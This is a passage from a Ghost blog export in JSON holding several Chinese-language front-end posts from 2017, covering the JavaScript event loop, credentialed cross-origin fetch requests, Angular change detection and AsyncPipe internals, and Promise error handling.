markdown-->","comment_id":"112","plaintext":"js是一门单线程语言。但不是简单的单线程，它还有异步任务机制。js引擎同步代码全部在 \"执行栈\" 跑，除了这个还有一个\"任务队列\"（task\nqueue）。一旦\"执行栈\"中的所有同步任务执行完毕，系统就会读取\"任务队列\"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入下一个执行栈，开始执行。整个过程是无限循环的，这就是Event\nLoop（事件循环）。\n\n> 定时器\n\n\n在浏览器中，除了dom和网络异步任务外，剩下的就是定时器了。setTimeout()和setInterval()，HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。老版本的浏览器都将最短间隔设为10毫秒。因此，setTimeout(()=>{},0)，根本不是0秒。\n\n> Node.js的Event Loop\n\n\nnode除了setTimeout和setInterval这两个方法,还有process.nextTick和setImmediate。\nprocess.nextTick方法可以push到当前\"执行栈\"的尾部。setImmediate方法则是在当前\"任务队列\"的尾部添加事件，是在下一次Event\nLoop时执行。\n\nprocess.nextTick(function A() {\n  console.log(1);\n  process.nextTick(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n  console.log('Next Event Loop');\n}, 0)\n// 1\n// 2\n// TIMEOUT FIRED\n\n\nsetTimeout和setImmediate这两个一样，都是在下一次Event Loop时执行。他们的先后顺序是不确定的。\n\n在使用递归的时候，应该谨慎使用process.nextTick。因为process.nextTick总是在执行，主线程不会去读取\"事件队列\"！","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-05-26T08:13:37.000Z","created_by":"1","updated_at":"2017-05-26T09:06:42.000Z","updated_by":"1","published_at":"2017-05-26T09:06:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d32d","uuid":"3564741f-6b92-40d1-a3a7-f2982c08b3a1","title":"fetch 带cookie跨域访问","slug":"fetch-dai-cookiekua-yu-fang-wen","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> fetch\\n\\n今天,新项目，以前是自己用nginx反向代理，来解决开发跨越的问题。现在，后台设置`Header Access-Control-Allow-Origin:*`，在fetch上，遇到了一点困难。\\n\\n```\\nexport async function get_companies(search = '') {\\n  return request(`/companies/`, {\\n    method: \\\"get\\\",\\n    credentials: 'include',\\n    mode: 'cors',\\n    headers: {\\n       'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'\\n    }\\n  });\\n}\\n```\\n直接这样请求。会报错\\n```\\nFetch API cannot load http://dadigua.com/companies/. The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. Origin 'http://localhost:4000' is therefore not allowed access.\\n```\\n是因为后台只设置了`Header Access-Control-Allow-Origin:*`，此时可以进行跨越访问了。但是还能不带cookie，把`credentials: 'include'`,注释，就成功了。\\n\\n要想带cookie，后台必须还要设置。`response.setHeader(\\\"Access-Control-Allow-Credentials\\\",\\\"true\\\");`\\n\\n> ajax写法\\n\\n* 后台设置`Access-Control-Allow-Credentials: true;`\\n\\n* 前端`var xhr = new XMLHttpRequest();xhr.withCredentials = true;`\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>fetch</p>\n</blockquote>\n<p>今天,新项目，以前是自己用nginx反向代理，来解决开发跨越的问题。现在，后台设置<code>Header Access-Control-Allow-Origin:*</code>，在fetch上，遇到了一点困难。</p>\n<pre><code>export async function get_companies(search = '') {\n  return request(`/companies/`, {\n    method: &quot;get&quot;,\n    credentials: 'include',\n    mode: 'cors',\n    headers: {\n       'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'\n    }\n  });\n}\n</code></pre>\n<p>直接这样请求。会报错</p>\n<pre><code>Fetch API cannot load http://dadigua.com/companies/. The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. Origin 'http://localhost:4000' is therefore not allowed access.\n</code></pre>\n<p>是因为后台只设置了<code>Header Access-Control-Allow-Origin:*</code>，此时可以进行跨越访问了。但是还能不带cookie，把<code>credentials: 'include'</code>,注释，就成功了。</p>\n<p>要想带cookie，后台必须还要设置。<code>response.setHeader(&quot;Access-Control-Allow-Credentials&quot;,&quot;true&quot;);</code></p>\n<blockquote>\n<p>ajax写法</p>\n</blockquote>\n<ul>\n<li>\n<p>后台设置<code>Access-Control-Allow-Credentials: true;</code></p>\n</li>\n<li>\n<p>前端<code>var xhr = new XMLHttpRequest();xhr.withCredentials = true;</code></p>\n</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"113","plaintext":"> fetch\n\n\n今天,新项目，以前是自己用nginx反向代理，来解决开发跨越的问题。现在，后台设置Header Access-Control-Allow-Origin:*\n，在fetch上，遇到了一点困难。\n\nexport async function get_companies(search = '') {\n  return request(`/companies/`, {\n    method: \"get\",\n    credentials: 'include',\n    mode: 'cors',\n    headers: {\n       'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'\n    }\n  });\n}\n\n\n直接这样请求。会报错\n\nFetch API cannot load http://dadigua.com/companies/. The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. Origin 'http://localhost:4000' is therefore not allowed access.\n\n\n是因为后台只设置了Header Access-Control-Allow-Origin:*，此时可以进行跨越访问了。但是还能不带cookie，把\ncredentials: 'include',注释，就成功了。\n\n要想带cookie，后台必须还要设置。\nresponse.setHeader(\"Access-Control-Allow-Credentials\",\"true\");\n\n> ajax写法\n\n\n * 后台设置Access-Control-Allow-Credentials: true;\n   \n   \n * 前端var xhr = new XMLHttpRequest();xhr.withCredentials = true;","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-06-19T08:11:24.000Z","created_by":"1","updated_at":"2017-06-19T08:33:48.000Z","updated_by":"1","published_at":"2017-06-19T08:28:41.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d32e","uuid":"1a141089-b69c-4464-a19f-901dbedd8e77","title":"angular变化检测","slug":"angularbian-hua-jian-ce","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"# angular变化检测\\n\\n## ChangeDetectionStrategy\\n\\n[源码](https://github.com/angular/angular/blob/master/packages/core/src/change_detection/constants.ts)  描述使用哪种变化检测器。\\n\\n- OnPush = 0   `OnPush` 检测一次`CheckOnce`(只有当@Input改变了，才进行变化检测并render。)\\n- Default = 1  `Default` 总是检测`CheckAlways  `\\n\\n## ChangeDetectorStatus \\n\\n[源码](https://github.com/angular/angular/blob/master/packages/core/src/change_detection/constants.ts)  描述监测器的状态\\n\\n* CheckOnce = 0  意味着在执行变化检测后，状态将变成 `Checked`。\\n* Checked = 1  该状态下，变化检测总是跳过，除非它的状态变成`CheckOnce`。\\n* CheckAlways = 2  总是执行变化检测，执行后状态还是`CheckAlways  `。\\n* Detached = 3  表示检测器子树不是主树的一部分，应该跳过。应该是调用ChangeDetectorRef.detach。\\n* Errored = 4  意味着变化检测器遇到了一个错误，状态将变成`Errored`。此状态中的更改检测器将不再检测更改。\\n* Destroyed = 5  意味着变化检测器已经销毁。\\n\\n## NgZone\\n\\napi:[NgZone](https://angular.io/api/core/NgZone)\\n\\nngZone包装了大量的事件和异步函数，下面的函数执行完成，会自动告诉Angular去执行变化监测。当发生变化时则重新渲染。\\n\\nNgZone有3个方法`runOutsideAngular` `runGuarded` `run`类型都是(fn: () => any): any;。\\n1. `runOutsideAngular`就是在fn中执行上面的方法，不会通知angular进行变化检测。\\n2. `runGuarded` `run`差不多，fn执行后进行变化检测。`run`会重复抛出错误且不会上报onError。`runGuarded`则相反。`runGuarded`应该更安全一点。\\n## ChangeDetectorRef\\n\\napi:[ChangeDetectorRef](https://angular.io/api/core/ChangeDetectorRef#detectChanges)\\n\\n```typescript\\nclass ChangeDetectorRef {\\n  markForCheck(): void\\n  detach(): void\\n  detectChanges(): void\\n  checkNoChanges(): void\\n  reattach(): void\\n}\\n```\\n- markForCheck() - 从自己到根组件检测器为OnPush的组件， 设置状态为`CheckOnce`。\\n- detach() - 从变化检测树中分离，该组件将不再执行变化检测，除非手动调用 reattach() 方法。\\n- reattach() - 重新添加已分离的变化检测器。\\n- detectChanges() - 从该组件到各个子组件执行一次变化检测，一般是配合detach使用，会触发 `ApplicationRef.tick()`方法\\n- checkNoChanges() - 从该组件到各个子组件执行一次变化检测，若发生改变则抛出检测，一般用于debug。\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h1 id=\"angular\">angular变化检测</h1>\n<h2 id=\"changedetectionstrategy\">ChangeDetectionStrategy</h2>\n<p><a href=\"https://github.com/angular/angular/blob/master/packages/core/src/change_detection/constants.ts\">源码</a>  描述使用哪种变化检测器。</p>\n<ul>\n<li>OnPush = 0   <code>OnPush</code> 检测一次<code>CheckOnce</code>(只有当@Input改变了，才进行变化检测并render。)</li>\n<li>Default = 1  <code>Default</code> 总是检测<code>CheckAlways  </code></li>\n</ul>\n<h2 id=\"changedetectorstatus\">ChangeDetectorStatus</h2>\n<p><a href=\"https://github.com/angular/angular/blob/master/packages/core/src/change_detection/constants.ts\">源码</a>  描述监测器的状态</p>\n<ul>\n<li>CheckOnce = 0  意味着在执行变化检测后，状态将变成 <code>Checked</code>。</li>\n<li>Checked = 1  该状态下，变化检测总是跳过，除非它的状态变成<code>CheckOnce</code>。</li>\n<li>CheckAlways = 2  总是执行变化检测，执行后状态还是<code>CheckAlways  </code>。</li>\n<li>Detached = 3  表示检测器子树不是主树的一部分，应该跳过。应该是调用ChangeDetectorRef.detach。</li>\n<li>Errored = 4  意味着变化检测器遇到了一个错误，状态将变成<code>Errored</code>。此状态中的更改检测器将不再检测更改。</li>\n<li>Destroyed = 5  意味着变化检测器已经销毁。</li>\n</ul>\n<h2 id=\"ngzone\">NgZone</h2>\n<p>api:<a href=\"https://angular.io/api/core/NgZone\">NgZone</a></p>\n<p>ngZone包装了大量的事件和异步函数，下面的函数执行完成，会自动告诉Angular去执行变化监测。当发生变化时则重新渲染。</p>\n<p>NgZone有3个方法<code>runOutsideAngular</code> <code>runGuarded</code> <code>run</code>类型都是(fn: () =&gt; any): any;。</p>\n<ol>\n<li><code>runOutsideAngular</code>就是在fn中执行上面的方法，不会通知angular进行变化检测。</li>\n<li><code>runGuarded</code> <code>run</code>差不多，fn执行后进行变化检测。<code>run</code>会重复抛出错误且不会上报onError。<code>runGuarded</code>则相反。<code>runGuarded</code>应该更安全一点。</li>\n</ol>\n<h2 id=\"changedetectorref\">ChangeDetectorRef</h2>\n<p>api:<a href=\"https://angular.io/api/core/ChangeDetectorRef#detectChanges\">ChangeDetectorRef</a></p>\n<pre><code class=\"language-typescript\">class ChangeDetectorRef {\n  markForCheck(): void\n  detach(): void\n  detectChanges(): void\n  checkNoChanges(): void\n  reattach(): void\n}\n</code></pre>\n<ul>\n<li>markForCheck() - 从自己到根组件检测器为OnPush的组件， 设置状态为<code>CheckOnce</code>。</li>\n<li>detach() - 从变化检测树中分离，该组件将不再执行变化检测，除非手动调用 reattach() 方法。</li>\n<li>reattach() - 重新添加已分离的变化检测器。</li>\n<li>detectChanges() - 从该组件到各个子组件执行一次变化检测，一般是配合detach使用，会触发 <code>ApplicationRef.tick()</code>方法</li>\n<li>checkNoChanges() - 从该组件到各个子组件执行一次变化检测，若发生改变则抛出检测，一般用于debug。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"114","plaintext":"angular变化检测\nChangeDetectionStrategy\n源码\n[https://github.com/angular/angular/blob/master/packages/core/src/change_detection/constants.ts] \n描述使用哪种变化检测器。\n\n * OnPush = 0 OnPush 检测一次CheckOnce(只有当@Input改变了，才进行变化检测并render。)\n * Default = 1 Default 总是检测CheckAlways \n\nChangeDetectorStatus\n源码\n[https://github.com/angular/angular/blob/master/packages/core/src/change_detection/constants.ts] \n描述监测器的状态\n\n * CheckOnce = 0 意味着在执行变化检测后，状态将变成 Checked。\n * Checked = 1 该状态下，变化检测总是跳过，除非它的状态变成CheckOnce。\n * CheckAlways = 2 总是执行变化检测，执行后状态还是CheckAlways 。\n * Detached = 3 表示检测器子树不是主树的一部分，应该跳过。应该是调用ChangeDetectorRef.detach。\n * Errored = 4 意味着变化检测器遇到了一个错误，状态将变成Errored。此状态中的更改检测器将不再检测更改。\n * Destroyed = 5 意味着变化检测器已经销毁。\n\nNgZone\napi:NgZone [https://angular.io/api/core/NgZone]\n\nngZone包装了大量的事件和异步函数，下面的函数执行完成，会自动告诉Angular去执行变化监测。当发生变化时则重新渲染。\n\nNgZone有3个方法runOutsideAngular runGuarded run类型都是(fn: () => any): any;。\n\n 1. runOutsideAngular就是在fn中执行上面的方法，不会通知angular进行变化检测。\n 2. runGuarded run差不多，fn执行后进行变化检测。run会重复抛出错误且不会上报onError。runGuarded则相反。\n    runGuarded应该更安全一点。\n\nChangeDetectorRef\napi:ChangeDetectorRef\n[https://angular.io/api/core/ChangeDetectorRef#detectChanges]\n\nclass ChangeDetectorRef {\n  markForCheck(): void\n  detach(): void\n  detectChanges(): void\n  checkNoChanges(): void\n  reattach(): void\n}\n\n\n * markForCheck() - 从自己到根组件检测器为OnPush的组件， 设置状态为CheckOnce。\n * detach() - 从变化检测树中分离，该组件将不再执行变化检测，除非手动调用 reattach() 方法。\n * reattach() - 重新添加已分离的变化检测器。\n * detectChanges() - 从该组件到各个子组件执行一次变化检测，一般是配合detach使用，会触发 ApplicationRef.tick()\n   方法\n * checkNoChanges() - 从该组件到各个子组件执行一次变化检测，若发生改变则抛出检测，一般用于debug。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-01T07:13:39.000Z","created_by":"1","updated_at":"2017-08-04T09:10:32.000Z","updated_by":"1","published_at":"2017-08-01T07:13:48.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d32f","uuid":"17175962-d676-4935-9120-2c1c84589a3c","title":"AsyncPipe源码分析","slug":"asyncpipe","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"### AsyncPipe\\n\\n在严格要求性能的环境下，使用ngZone更新视图，是不行的。这时我们可以使用 Observables 机制提升性能。先把组件设置` {changeDetection:ChangeDetectionStrategy.OnPush}` 这时不会触发ngZone来进行脏检查，这时我们可以通过AsyncPipe管道订阅 Observables 对象，在变化发生之后，进行视图更新。\\n\\n源码链接[angular/AsyncPipe](https://github.com/angular/angular/blob/master/packages/common/src/pipes/async_pipe.ts)\\n\\n### 用法\\n\\n* AsyncPipe不仅仅支持Observable<T>，还支持Promise<T>。对于Observable，只要subscribe属性是一个function类型，和参数是一个对象有next属性就行。不一定要rx的Observable。可以自己实现一个迷你的Observable。\\n\\n### 原理\\n\\n```javascript\\n constructor(private _ref: ChangeDetectorRef) {}\\n private _updateLatestValue(async: any, value: Object): void {\\n    if (async === this._obj) {\\n      this._latestValue = value;\\n      this._ref.markForCheck();\\n    }\\n  }//当接收数据的时候，利用this._ref.markForCheck();更新组件\\n  ngOnDestroy(): void {\\n    if (this._subscription) {\\n      this._dispose();//当组件销毁的时候，Observable会自动注销监听\\n    }\\n  }\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h3 id=\"asyncpipe\">AsyncPipe</h3>\n<p>在严格要求性能的环境下，使用ngZone更新视图，是不行的。这时我们可以使用 Observables 机制提升性能。先把组件设置<code> {changeDetection:ChangeDetectionStrategy.OnPush}</code> 这时不会触发ngZone来进行脏检查，这时我们可以通过AsyncPipe管道订阅 Observables 对象，在变化发生之后，进行视图更新。</p>\n<p>源码链接<a href=\"https://github.com/angular/angular/blob/master/packages/common/src/pipes/async_pipe.ts\">angular/AsyncPipe</a></p>\n<h3 id=\"\">用法</h3>\n<ul>\n<li>AsyncPipe不仅仅支持Observable<T>，还支持Promise<T>。对于Observable，只要subscribe属性是一个function类型，和参数是一个对象有next属性就行。不一定要rx的Observable。可以自己实现一个迷你的Observable。</li>\n</ul>\n<h3 id=\"\">原理</h3>\n<pre><code class=\"language-javascript\"> constructor(private _ref: ChangeDetectorRef) {}\n private _updateLatestValue(async: any, value: Object): void {\n    if (async === this._obj) {\n      this._latestValue = value;\n      this._ref.markForCheck();\n    }\n  }//当接收数据的时候，利用this._ref.markForCheck();更新组件\n  ngOnDestroy(): void {\n    if (this._subscription) {\n      this._dispose();//当组件销毁的时候，Observable会自动注销监听\n    }\n  }\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"115","plaintext":"AsyncPipe\n在严格要求性能的环境下，使用ngZone更新视图，是不行的。这时我们可以使用 Observables 机制提升性能。先把组件设置 \n{changeDetection:ChangeDetectionStrategy.OnPush} \n这时不会触发ngZone来进行脏检查，这时我们可以通过AsyncPipe管道订阅 Observables 对象，在变化发生之后，进行视图更新。\n\n源码链接angular/AsyncPipe\n[https://github.com/angular/angular/blob/master/packages/common/src/pipes/async_pipe.ts]\n\n用法\n * AsyncPipe不仅仅支持Observable，还支持Promise\n   。对于Observable，只要subscribe属性是一个function类型，和参数是一个对象有next属性就行。不一定要rx的Observable。可以自己实现一个迷你的Observable。\n\n原理\n constructor(private _ref: ChangeDetectorRef) {}\n private _updateLatestValue(async: any, value: Object): void {\n    if (async === this._obj) {\n      this._latestValue = value;\n      this._ref.markForCheck();\n    }\n  }//当接收数据的时候，利用this._ref.markForCheck();更新组件\n  ngOnDestroy(): void {\n    if (this._subscription) {\n      this._dispose();//当组件销毁的时候，Observable会自动注销监听\n    }\n  }","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-02T11:13:17.000Z","created_by":"1","updated_at":"2017-08-02T11:15:56.000Z","updated_by":"1","published_at":"2017-08-02T11:13:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d330","uuid":"cdbe2c99-40fa-4776-b209-6db5e07933b4","title":"js异常捕获","slug":"jsyi-chang-bu-huo","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##### try/catch\\n\\n```javascript\\ntry{\\n    try{\\n\\t\\tthrow('error')\\n    }catch(e){\\n       console.error(e)//输出\\n    }\\n}catch(e){\\n  console.error(e,2)//不输出\\n}\\n```\\n\\n```javascript\\ntry{\\n    try{\\n\\t\\tthrow('error')\\n    }catch(e){\\n       console.error(e)//输出\\n       throw(e)\\n    }\\n}catch(e){\\n  console.error(e,2)//输出\\n}\\n```\\n\\n##### Promise或async函数中\\n```javascript\\nnew Promise((resolve,reject)=>{\\n   new Promise((resolve,reject)=>{\\n      reject('error')//可以换throw(e)\\n  }).then().catch((e)=>{console.error(e); reject(e)//不能换throw(e)})\\n}).then().catch((e)=>{console.error(e,2)})\\n```\\n```javascript\\nnew Promise((resolve,reject)=>{\\n      resolve(1)\\n}).then((data)=>{return data})\\n  .then(()=>{throw(1)})\\n  .catch((x)=>{console.log(x)})\\n```\\n\\n```javascript\\nnew Promise((resolve,reject)=>{\\n      resolve(1)\\n}).then((data)=>{return data})\\n  .then(()=>{ \\n      return new Promise((resolve,reject)=>{\\n            throw('error')\\n      }) \\n   })\\n  .catch((x)=>{console.log(x)})\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h5 id=\"trycatch\">try/catch</h5>\n<pre><code class=\"language-javascript\">try{\n    try{\n\t\tthrow('error')\n    }catch(e){\n       console.error(e)//输出\n    }\n}catch(e){\n  console.error(e,2)//不输出\n}\n</code></pre>\n<pre><code class=\"language-javascript\">try{\n    try{\n\t\tthrow('error')\n    }catch(e){\n       console.error(e)//输出\n       throw(e)\n    }\n}catch(e){\n  console.error(e,2)//输出\n}\n</code></pre>\n<h5 id=\"promiseasync\">Promise或async函数中</h5>\n<pre><code class=\"language-javascript\">new Promise((resolve,reject)=&gt;{\n   new Promise((resolve,reject)=&gt;{\n      reject('error')//可以换throw(e)\n  }).then().catch((e)=&gt;{console.error(e); reject(e)//不能换throw(e)})\n}).then().catch((e)=&gt;{console.error(e,2)})\n</code></pre>\n<pre><code class=\"language-javascript\">new Promise((resolve,reject)=&gt;{\n      resolve(1)\n}).then((data)=&gt;{return data})\n  .then(()=&gt;{throw(1)})\n  .catch((x)=&gt;{console.log(x)})\n</code></pre>\n<pre><code class=\"language-javascript\">new Promise((resolve,reject)=&gt;{\n      resolve(1)\n}).then((data)=&gt;{return data})\n  .then(()=&gt;{ \n      return new Promise((resolve,reject)=&gt;{\n            throw('error')\n      }) \n   })\n  .catch((x)=&gt;{console.log(x)})\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"116","plaintext":"try/catch\ntry{\n    try{\n\t\tthrow('error')\n    }catch(e){\n       console.error(e)//输出\n    }\n}catch(e){\n  console.error(e,2)//不输出\n}\n\n\ntry{\n    try{\n\t\tthrow('error')\n    }catch(e){\n       console.error(e)//输出\n       throw(e)\n    }\n}catch(e){\n  console.error(e,2)//输出\n}\n\n\nPromise或async函数中\nnew Promise((resolve,reject)=>{\n   new Promise((resolve,reject)=>{\n      reject('error')//可以换throw(e)\n  }).then().catch((e)=>{console.error(e); reject(e)//不能换throw(e)})\n}).then().catch((e)=>{console.error(e,2)})\n\n\nnew Promise((resolve,reject)=>{\n      resolve(1)\n}).then((data)=>{return data})\n  .then(()=>{throw(1)})\n  .catch((x)=>{console.log(x)})\n\n\nnew Promise((resolve,reject)=>{\n      resolve(1)\n}).then((data)=>{return data})\n  .then(()=>{ \n      return new Promise((resolve,reject)=>{\n            throw('error')\n      }) \n   })\n  .catch((x)=>{console.log(x)})","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-02T11:20:19.000Z","created_by":"1","updated_at":"2017-08-02T11:20:29.000Z","updated_by":"1","published_at":"2017-08-02T11:20:29.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d331","uuid":"45606fad-068e-40f7-9f7d-ca3ec519e4c5","title":"angular变化检测实现原理","slug":"angularbian-hua-jian-ce-shi-xian-yuan-li","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"# angular变化检测实现原理\\n\\n## ViewFlags\\n\\nViewFlags视图更新方式与ChangeDetectionStrategy对应\\n\\n```typescript\\nexport const enum ViewFlags {\\n  None = 0,\\n  OnPush = 1 << 1,\\n}\\n```\\n\\n## ViewState\\n\\nViewState视图状态与ChangeDetectorStatus对应。使用位码做状态，好处是可以同一时间处于多个状态。\\n\\n```typescript\\nexport const enum ViewState {\\n  BeforeFirstCheck = 1 << 0,\\n  FirstCheck = 1 << 1,\\n  Attached = 1 << 2,\\n  ChecksEnabled = 1 << 3,\\n  IsProjectedView = 1 << 4,\\n  CheckProjectedView = 1 << 5,\\n  CheckProjectedViews = 1 << 6,\\n  Destroyed = 1 << 7,\\n\\n  CatDetectChanges = Attached | ChecksEnabled,  //处于Attached（已添加）和ChecksEnabled（开启更新）都是true\\n  CatInit = BeforeFirstCheck | CatDetectChanges  //这个状态还加上了在第一检测之前的状态。\\n}\\n```\\n\\n## checkAndUpdateView\\n\\n视图的变化检测与更新，这是检查模板上面绑定的新数据和以前的对比。若变化则更新。当视图是OnPush时，去掉ChecksEnabled状态。\\n\\n```typescript\\nfunction callViewAction(view: ViewData, action: ViewAction) {\\n  const viewState = view.state;\\n  switch (action) {\\n\\t...\\n    case ViewAction.CheckAndUpdate:\\n      if ((viewState & ViewState.Destroyed) === 0) {//组件不能处于Destroyed状态\\n        if ((viewState & ViewState.CatDetectChanges) === ViewState.CatDetectChanges) {//组件必须处于CatDetectChanges状态\\n          checkAndUpdateView(view);  //执行变化检测\\n        } else if (viewState & ViewState.CheckProjectedViews) {\\n          execProjectedViewsAction(view, ViewAction.CheckAndUpdateProjectedViews);\\n        }\\n      }\\n      break;\\n\\t...\\n\\n  }\\n}\\n\\nexport function checkAndUpdateView(view: ViewData) {\\n  if (view.state & ViewState.BeforeFirstCheck) {\\n    view.state &= ~ViewState.BeforeFirstCheck;\\n    view.state |= ViewState.FirstCheck;\\n  } else {\\n    view.state &= ~ViewState.FirstCheck;\\n  }\\n  markProjectedViewsForCheck(view);\\n  Services.updateDirectives(view, CheckType.CheckAndUpdate);\\n  execEmbeddedViewsAction(view, ViewAction.CheckAndUpdate);\\n  execQueriesAction(\\n      view, NodeFlags.TypeContentQuery, NodeFlags.DynamicQuery, CheckType.CheckAndUpdate);\\n\\n  callLifecycleHooksChildrenFirst(\\n      view, NodeFlags.AfterContentChecked |\\n          (view.state & ViewState.FirstCheck ? NodeFlags.AfterContentInit : 0));\\n\\n  Services.updateRenderer(view, CheckType.CheckAndUpdate);\\n\\n  execComponentViewsAction(view, ViewAction.CheckAndUpdate);\\n  execQueriesAction(\\n      view, NodeFlags.TypeViewQuery, NodeFlags.DynamicQuery, CheckType.CheckAndUpdate);\\n  callLifecycleHooksChildrenFirst(\\n      view, NodeFlags.AfterViewChecked |\\n          (view.state & ViewState.FirstCheck ? NodeFlags.AfterViewInit : 0));\\n\\n  if (view.def.flags & ViewFlags.OnPush) {\\n    view.state &= ~ViewState.ChecksEnabled;  //当视图是OnPush时，去掉ChecksEnabled状态。\\n  }\\n  view.state &= ~(ViewState.CheckProjectedViews | ViewState.CheckProjectedView);\\n}\\n```\\n\\n## ViewRef\\n\\n1. markForCheck(): void//从当前组件开始向上,当视图是OnPush时，添加ChecksEnabled状态,在进行一次变化检测后，会去掉ChecksEnabled状态。\\n\\n   ```typescript\\n   markForCheck(): void { markParentViewsForCheck(this._view); }\\n   export function markParentViewsForCheck(view: ViewData) {\\n     let currView: ViewData|null = view;\\n     while (currView) {\\n       if (currView.def.flags & ViewFlags.OnPush) {\\n         currView.state |= ViewState.ChecksEnabled;  //当视图是OnPush时，添加ChecksEnabled状态。\\n       }\\n       currView = currView.viewContainerParent || currView.parent;  //从当前组件开始向上。\\n     }\\n   }\\n   ```\\n\\n2. ​ detach(): void\\n\\n   ```typescript\\n   detach(): void { this._view.state &= ~ViewState.Attached; }  //去掉Attached状态\\n   ```\\n\\n3.  detectChanges(): void\\n\\n   ```typescript\\n     detectChanges(): void {\\n       const fs = this._view.root.rendererFactory;\\n       if (fs.begin) {\\n         fs.begin();\\n       }\\n       Services.checkAndUpdateView(this._view); //执行checkAndUpdateView函数\\n       if (fs.end) {\\n         fs.end();\\n       }\\n     }\\n   ```\\n\\n4. ​ detach(): void\\n\\n   ```typescript\\n   reattach(): void { this._view.state |= ViewState.Attached; } //添加Attached状态\\n   ```\\n\\n## ApplicationRef\\n\\nApplicationRef是根组件。订阅了zone通知，对自己和子节点进行变化检测，调用view.detectChanges()。\\n\\n```typescript\\nexport class ApplicationRef_ extends ApplicationRef{\\n    constructor(private _zone: NgZone, private _console: Console, private _injector: Injector,\\n      private _exceptionHandler: ErrorHandler,\\n      private _componentFactoryResolver: ComponentFactoryResolver,\\n      private _initStatus: ApplicationInitStatus) {\\n      ...\\n      this._zone.onMicrotaskEmpty.subscribe(\\n          {next: () => { this._zone.run(() => { this.tick(); }); }});//订阅zone的通知，然后执行tick变化检测的函数。\\n      ...\\n    }\\n    tick(): void {\\n      if (this._runningTick) {\\n        throw new Error('ApplicationRef.tick is called recursively');\\n      }\\n\\n      const scope = ApplicationRef_._tickScope();\\n      try {\\n        this._runningTick = true;\\n        this._views.forEach((view) => view.detectChanges());//对自己和子节点进行变化检测。\\n        if (this._enforceNoNewChanges) {\\n          this._views.forEach((view) => view.checkNoChanges());\\n        }\\n      } catch (e) {\\n        // Attention: Don't rethrow as it could cancel subscriptions to Observables!\\n        this._zone.runOutsideAngular(() => this._exceptionHandler.handleError(e));\\n      } finally {\\n        this._runningTick = false;\\n        wtfLeave(scope);\\n      }\\n  }\\n}\\n```\\n## 触发事件\\n\\n组件即使在ChangeDetectionStrategy.OnPush的模式下，在自己范围内触发事件也可以触发一次变化检测。\\n\\n```typescript\\nexport function dispatchEvent(\\n    view: ViewData, nodeIndex: number, eventName: string, event: any): boolean|undefined {\\n  try {\\n    const nodeDef = view.def.nodes[nodeIndex];\\n    const startView = nodeDef.flags & NodeFlags.ComponentView ?\\n        asElementData(view, nodeIndex).componentView :\\n        view;\\n    markParentViewsForCheck(startView);   //就是执行了markForCheck()。这样可以执行一次变化检测了。\\n    return Services.handleEvent(view, nodeIndex, eventName, event);\\n  } catch (e) {\\n    // Attention: Don't rethrow, as it would cancel Observable subscriptions!\\n    view.root.errorHandler.handleError(e);\\n  }\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h1 id=\"angular\">angular变化检测实现原理</h1>\n<h2 id=\"viewflags\">ViewFlags</h2>\n<p>ViewFlags视图更新方式与ChangeDetectionStrategy对应</p>\n<pre><code 